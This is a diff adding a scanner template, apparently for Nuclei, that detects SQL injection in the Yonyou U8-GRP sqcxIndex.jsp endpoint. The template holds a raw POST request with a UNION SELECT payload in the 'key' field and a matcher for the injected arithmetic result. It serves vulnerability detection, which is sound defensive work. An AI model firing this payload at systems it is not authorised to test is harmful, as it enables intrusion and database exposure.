@@ -1,0 +1,22 @@
+id: yonyou-u8-grp-sqcxindex-sqli
+ 
+info:
+  name: 用友U8-GRP sqcxindex sql注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /u8qx/sqcxIndex.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        11=11&key=2%25')+union+select+@@version,11131*123123--+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'1370482113') && status_code == 200"
